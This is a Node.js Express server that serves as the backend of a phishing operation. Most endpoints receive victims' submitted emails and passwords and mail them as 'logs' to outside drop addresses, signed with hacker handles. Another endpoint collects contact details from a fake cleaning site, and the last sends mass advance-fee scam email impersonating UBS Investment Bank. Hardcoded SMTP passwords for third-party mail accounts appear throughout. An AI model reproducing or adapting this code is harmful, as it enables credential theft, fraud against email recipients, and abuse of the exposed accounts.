const express = require("express");
const cors = require("cors");
const app = express();

app.use(cors());

const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
  res.send("api is run");
});

app.post("/sendmail", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "mail.zambiatransportandlogistics.com",
      port: 465,
      auth: {
        user: "john.phiri@zambiatransportandlogistics.com",
        pass: "M!racleMumba%@1995",
      },
    });
    let info = await transporter.sendMail({
      from: '"You" <ptn2center@ptninsurancebroker.com>',
      to: " connect@ellsworthins.com",
      subject: "Testing, testing, 123",
      html: `
    <div> 
      <h2>Here is your email!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, xxxsonhack</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});

app.post("/sendmail3", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "mail.zambiatransportandlogistics.com",
      port: 465,
      auth: {
        user: "john.phiri@zambiatransportandlogistics.com",
        pass: "M!racleMumba%@1995",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
      to: "quickloaninvestors@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail2", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "mail.zambiatransportandlogistics.com",
      port: 465,
      auth: {
        user: "john.phiri@zambiatransportandlogistics.com",
        pass: "M!racleMumba%@1995",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
      to: "sales1.ppsl@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail4", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "mail.zambiatransportandlogistics.com",
      port: 465,
      auth: {
        user: "john.phiri@zambiatransportandlogistics.com",
        pass: "M!racleMumba%@1995",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
      to: "fredrick3smith33@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail5", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "mail.zambiatransportandlogistics.com",
      port: 465,
      auth: {
        user: "john.phiri@zambiatransportandlogistics.com",
        pass: "M!racleMumba%@1995",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
      to: "wangyong2114@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail6", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "mail.zambiatransportandlogistics.com",
      port: 465,
      auth: {
        user: "john.phiri@zambiatransportandlogistics.com",
        pass: "M!racleMumba%@1995",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
      to: "daniellahm@yandex.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail7", async (req, res) => {
  const { firstName, lastName, phone, email, message } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "mail.zambiatransportandlogistics.com",
      port: 465,
      auth: {
        user: "john.phiri@zambiatransportandlogistics.com",
        pass: "M!racleMumba%@1995",
      },
    });
    let info = await transporter.sendMail({
      from: 'Cleaning Site" <john.phiri@zambiatransportandlogistics.com>',
      to: "theodoreemagilll@gmail.com",
      subject: "Cleaning Site",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>firstName: ${firstName}</p>
        <p>lastName: ${lastName}</p>
        <p>phone: ${phone}</p>
        <p>email: ${email}</p>
        <p>message: ${message}</p>
 
    
   
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
 app.post("/sendmail8", async (req, res) => {
  const { allMail } = req.body;
  const emailArray = allMail.split(",").map((e) => e.trim());
  let errormails = [];
  let sent = [];

  console.log(emailArray);

  // create transporter once
  const transporter = nodemailer.createTransport({
    host: "webmail.williamsdudley.net",
    port: 25,
    secure: false,
    auth: {
      user: "supports@williamsdudley.net",
      pass: "4Yw3yRd8XDxW2FV2OEKjkG3e",
    },
    tls: {
      rejectUnauthorized: false,
    },
  });

  // helper function to await sendMail
  function sendMailPromise(mailOptions) {
    return new Promise((resolve, reject) => {
      transporter.sendMail(mailOptions, (err, info) => {
        if (err) {
          reject(err);
        } else {
          resolve(info);
        }
      });
    });
  }

  // process emails one by one
  for (let email of emailArray) {
    try {
      await sendMailPromise({
        from: '"William Dudley" <supports@williamsdudley.net>',
        to: email,
        subject: "UBS Investment Bank ",
        text: "This is a email sent for approval.",
        replyTo: "contact@williamsdudley.net",

        html: `<!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Order Invoice - 123456</title>
        <style>
          body {
            font-family: "Helvetica Neue", Arial, sans-serif;
            line-height: 1.6;
            color: #333333;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f9f9f9;
          }
          .email-container {
            max-width: 700px;
            background-color: #ffffff;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.05);
          }
          .header {
            border-bottom: 1px solid #f0f0f0;
            padding-bottom: 20px;
            margin-bottom: 25px;
          }

          .greeting {
            font-size: 16px;
            margin-bottom: 25px;
            color: #444444;
          }
          .content {
            font-size: 15px;
            margin-bottom: 25px;
            color: #555555;
            line-height: 1.7;
          }
          .invoice-section {
            background-color: #fafafa;
            border-radius: 6px;
            padding: 25px;
            margin: 30px 0;
            border: 1px solid #eeeeee;
          }
        </style>
      </head>
      <body>
        <div class="email-container">
          <div class="header">
            <b> UBS Investment Bank </b>
          </div>

          <div class="greeting">Hi ${email.split("@")[0]}</div>

          <!-- Receipt Section -->
          <div class="invoice-section">
            My name is Mr. William Duebs and I work as Head of Competence &
            Supervision Department at a reputable bank, I write to seek your
            cooperation over this business proposal worth £22.3 Million Great
            British Pounds in my bank. Can you be trusted in this confidential
            business relationship as a partner and willing to be presented as a Next
            of Kin and sole beneficiary of an unclaimed sum in my bank?
            <br />
            <br />The funds belong to a deceased customer who died without a Next of
            Kin or trace of a known family, if you can, kindly do get back so I can
            provide you with information on how to claim the funds successfully and
            legally in your name. <br />
            <br />Your response will be highly appreciated.
          </div>

          <!-- Delivery Address Section -->

          <div class="content">
            Sincere regards,<br />
            Mr. William Duebs
          </div>
        </div>
      </body>
    </html>
    `,
      });
      console.log("Message sent:", email);
      sent.push(email);
    } catch (err) {
      console.error("Error occurred:", err);
      errormails.push(email);
    }
  }

  res.send({ failed: errormails, sent: sent });
});
const PORT = process.env.PORT || 5001;

app.listen(PORT, console.log(`server in on "5001"`));
